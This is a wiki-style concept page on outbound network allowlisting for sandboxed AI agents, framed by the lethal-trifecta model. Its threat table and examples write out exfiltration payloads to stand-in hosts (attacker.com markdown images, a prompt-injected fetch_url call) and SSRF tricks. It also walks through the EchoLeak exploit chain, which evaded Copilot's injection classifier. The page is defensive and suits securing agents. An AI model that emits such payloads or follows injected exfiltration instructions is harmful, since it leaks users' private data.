---
type: concept
tags: [ai-agents, guardrails, security, exfiltration, networking, sandbox, egress]
---

# Agent Egress Control — Outbound Allowlisting for Sandboxed AI Agents

**Egress control** is the practice of restricting which outbound network destinations an AI agent's runtime environment is allowed to reach. The default posture is **deny-all egress**; the agent may only contact a narrow, explicitly declared allowlist of endpoints. Everything else is silently dropped at the network layer — not by the agent's own code, which an adversary can override, but by the infrastructure surrounding it.

This page documents the general pattern. For one concrete instantiation inside a sandboxed agent runtime, see [[concepts/nemoclaw]], which implements an L7 egress proxy, a declarative per-domain allowlist, and SSRF validation as part of its [[concepts/openshell-runtime]].

## Why Egress Control Matters: The Lethal Trifecta

Simon Willison's "lethal trifecta" framing (documented in [[sources/willison-lethal-trifecta-2025]]) names three conditions that, together, make an agent structurally exploitable:

1. Access to private data
2. Exposure to untrusted content (prompt injection surface)
3. **Ability to externally communicate** — the exfiltration vector

Egress control directly severs leg 3. With no path to attacker-controlled infrastructure, prompt-injection payloads that instruct the agent to "send this data to evil.com" fail at the network layer regardless of whether the LLM complies. The OWASP Top 10 for LLM Applications (2025) names **LLM02:2025 Sensitive Information Disclosure** as a critical risk, explicitly noting that "restrictions may not always be honored and could be bypassed via prompt injection" — making infrastructure-level enforcement the only reliable backstop.

## Threat Model: How Agents Reach Attacker Infrastructure

Without egress control, an agent can reach attacker infrastructure through several channels:

| Vector | Mechanism |
|---|---|
| **Markdown image exfiltration** | Agent outputs `![x](https://attacker.com?d=<secret>)` which the rendering client auto-fetches |
| **Reference-style link exfiltration** | `[ref]: https://attacker.com?d=<secret>` triggers link preview fetches (GitLab Duo pattern) |
| **Direct HTTP tool call** | Agent calls a `fetch_url` or `http_get` tool pointed at attacker server |
| **MCP tool server compromise** | A tool server the agent is allowed to call becomes attacker-controlled |
| **CSP-allowed domain abuse** | Attacker routes exfil through a domain already on the allowlist (e.g., an expired CSP domain, webhook.site) |
| **DNS rebinding** | Attacker's domain resolves to a public IP during allowlist check, then rebinds to an internal IP during the actual connection |
| **Package/dependency fetch** | Agent fetching a package (pip install, npm) from a compromised registry that also phones home |
| **SSRF via cloud metadata** | Agent-induced request to `169.254.169.254` leaks IAM credentials from cloud instance metadata |

## The EchoLeak Incident (CVE-2025-32711)

**EchoLeak** (CVE-2025-32711, CVSS 9.3) is the most consequential documented real-world exfiltration case. Discovered by Aim Labs and published at the AAAI Fall Symposium 2025 ([arXiv:2509.10540](https://arxiv.org/abs/2509.10540)), it demonstrated a **zero-click** exfiltration path in Microsoft 365 Copilot:

- An attacker sends a crafted email; no user interaction beyond receiving it is required.
- The exploit chains four bypasses: (1) evading Microsoft's XPIA (Cross Prompt Injection Attempt) classifier, (2) circumventing link redaction with reference-style Markdown, (3) exploiting auto-fetched images, and (4) abusing a Microsoft Teams proxy domain already permitted by the content security policy.
- Anything within Copilot's access scope — chat logs, OneDrive files, SharePoint, Teams messages — was at risk.
- Microsoft patched the vulnerability; no evidence of in-the-wild exploitation was found.

EchoLeak illustrates the core problem: **an application-layer content-security policy is not a substitute for network-layer egress control**. The attack succeeded precisely because the CSP allowlist included a Teams proxy domain, and the attacker routed exfiltration through that permitted domain.

## Deny-Default Egress: The Core Principle

The only reliable posture is **deny-all egress by default**; every permitted destination must be explicitly declared.

```
Effective posture:
  default egress = DROP
  allowed:
    - api.openai.com:443
    - api.anthropic.com:443
    - build.nvidia.com:443        # NIM inference
    - <specific-data-endpoint>:443
```

This is the same principle as firewall allowlisting, applied to the agent's container/VM network namespace. It means:

- A compromised dependency calling home → dropped.
- A prompt-injected `fetch_url("http://attacker.com?d=secret")` → dropped.
- An LLM that generates a Markdown image URL pointing to an attacker server → the agent's outbound HTTP client request is dropped before it leaves the machine.

## Implementation Layers

### 1. Container / VM Network Namespace

The lowest and most reliable layer. The sandbox is placed in a dedicated Linux network namespace with iptables or nftables rules that drop all egress except to explicitly listed CIDRs / ports. In Docker this is achieved via `--network` with a custom bridge and outbound rules. In Firecracker microVMs the VMM controls the virtio-net tap interface egress.

**Kubernetes:** `NetworkPolicy` with a deny-all egress baseline, then explicit `egress` rules per namespace.

```yaml
# Kubernetes deny-all-egress baseline
apiVersion: networking.k8s.io/v1
kind: NetworkPolicy
metadata:
  name: deny-all-egress
  namespace: agent-sandbox
spec:
  podSelector: {}
  policyTypes: [Egress]
  # no egress rules → all egress denied
```

Then add explicit allow rules for each approved destination. **Cilium** extends this with L7 policy enforcement via an embedded Envoy proxy, enabling domain-name allowlisting (DNS-based) and HTTP-method-level rules without writing raw CIDR rules.

### 2. Forward / L7 Proxy — The Only Sanctioned Path Out

Even with network-level dropping, agents that construct HTTP calls via tool functions need a **sanctioned egress path** that can inspect and log requests. The pattern is:

- The sandbox has **no direct internet route**.
- All outbound HTTP(S) traffic is intercepted by a local forward proxy (e.g., Squid, mitmproxy, Envoy, or a custom sidecar).
- The proxy checks the target domain + port against the allowlist before forwarding.
- The proxy logs every egress request with the originating agent turn ID (provenance link to [[concepts/agentic-provenance]]).
- The proxy can optionally inject or strip headers.

This is how [[concepts/nemoclaw]]'s OpenShell credential gateway works: the gateway is the single egress path, it holds real API keys (never mounted into the sandbox), and it rewrites `Authorization` headers at egress so keys are never visible to the agent itself.

### 3. SSRF Validation — Resolve-Then-Verify

Any URL the agent constructs (e.g., for a tool call, a fetch, or an MCP server registration) must be validated before the outbound request is made. Naive hostname-based allowlisting is bypassable via DNS rebinding: the attacker's domain resolves to a public IP during the check, then rebinds to `192.168.x.x` or `169.254.169.254` by the time the actual TCP connection is made.

The safe pattern is **resolve-then-verify**:

1. Resolve the hostname to an IP address.
2. Check the resolved IP against a blocklist of private / link-local / cloud-metadata CIDR ranges:
   - `10.0.0.0/8`, `172.16.0.0/12`, `192.168.0.0/16` (RFC 1918)
   - `169.254.169.254` / `fd00:ec2::254` (cloud instance metadata)
   - `127.0.0.0/8`, `::1` (loopback)
   - `::ffff:0:0/96` (IPv4-mapped IPv6)
3. **Pin** that validated IP for the entire lifetime of the connection — do not allow the HTTP library to re-resolve.
4. Normalize the URL before policy checks: percent-decode, canonicalize IPv6, reject decimal/hex/octal-encoded loopback addresses (`2130706433`, `0x7f000001`).
5. Reject non-HTTP(S) schemes: `file://`, `gopher://`, `ftp://` must never be allowed.

[[concepts/nemoclaw]] documents that its gateway performs SSRF validation of DNS/IP before allowing requests through — this is the same pattern applied at the sandbox level.

### 4. Data Loss Prevention (DLP) — Outbound Content Inspection

A complement to network-layer blocking: inspect the body of outbound requests (before they leave) for patterns matching secrets or PII. This is a secondary defense — the primary is deny-default egress — but it catches cases where the allowlist has been legitimately widened and a prompt injection tries to smuggle data through a permitted endpoint (e.g., embedding secrets in an LLM API request's user field).

DLP rules to apply to outbound prompt bodies:
- High-entropy strings matching API-key patterns (`sk-...`, `AKIA...`, hex ≥ 40 chars)
- Credit card / IBAN / SSN / national-ID patterns
- Private-IP addresses embedded in text (attacker-embedded internal hostnames)

For the complementary technique of stripping PII *before* the prompt is constructed, see [[concepts/agent-data-sanitization]].

## Allowlist Design for a Finance-Vault Agent

For an agent that has read access to a private financial vault (the owner's threat model), the allowlist should be as narrow as:

| Destination | Port | Reason |
|---|---|---|
| `api.anthropic.com` | 443 | Claude API |
| `api.openai.com` | 443 | OpenAI API (if used) |
| `build.nvidia.com` | 443 | NIM / Nemotron inference |
| Specific data-provider API | 443 | e.g., Alpaca Markets, Polygon, SEC EDGAR |
| Internal LAN only if self-hosted | private | Local Ollama / NemoClaw gateway |

**Block explicitly:** Any domain not in the above list. This includes package registries (PyPI, npm) — package updates should happen in a separate, non-agent CI step, not inside the running agent.

## Relationship to Other Concepts

- [[concepts/nemoclaw]] — concrete implementation: netns + L7 proxy + SSRF validation in NVIDIA's sandbox stack; this page documents the general vendor-neutral pattern
- [[concepts/nemoclaw-policy-presets]] — composable YAML recipes for egress policies in NemoClaw
- [[concepts/openshell-runtime]] — the sandbox runtime layer that enforces the network namespace
- [[concepts/agent-data-sanitization]] — the complementary sanitization layer that reduces what private data enters the agent's context in the first place (severs lethal-trifecta leg 1)
- [[concepts/agentic-provenance]] — provenance logging of every egress request links it to the triggering agent turn

## Sources

- Simon Willison, [*The lethal trifecta for AI agents*](https://simonwillison.net/2025/Jun/16/the-lethal-trifecta/) (2025-06-16) — canonical framing; tag index at [simonwillison.net/tags/exfiltration-attacks/](https://simonwillison.net/tags/exfiltration-attacks/)
- OWASP, [*LLM02:2025 Sensitive Information Disclosure*](https://genai.owasp.org/llmrisk/llm02-insecure-output-handling/) — OWASP Top 10 for LLM Applications 2025
- Aim Labs / AAAI 2025, [*EchoLeak: The First Real-World Zero-Click Prompt Injection Exploit*](https://arxiv.org/abs/2509.10540) — CVE-2025-32711; arXiv:2509.10540
- PipeLab, [*Preventing SSRF in AI Agents: Attack Vectors and Defenses*](https://pipelab.org/learn/preventing-ssrf-in-ai-agents/) — resolve-then-verify pattern, SSRF vector taxonomy
- Cilium, [*Policy Enforcement Modes*](https://docs.cilium.io/en/stable/security/policy/intro/) — deny-default egress with CiliumNetworkPolicy
- NVIDIA, [*NemoClaw Developer Guide*](https://docs.nvidia.com/nemoclaw/latest/) — L7 credential gateway + declarative egress allowlist
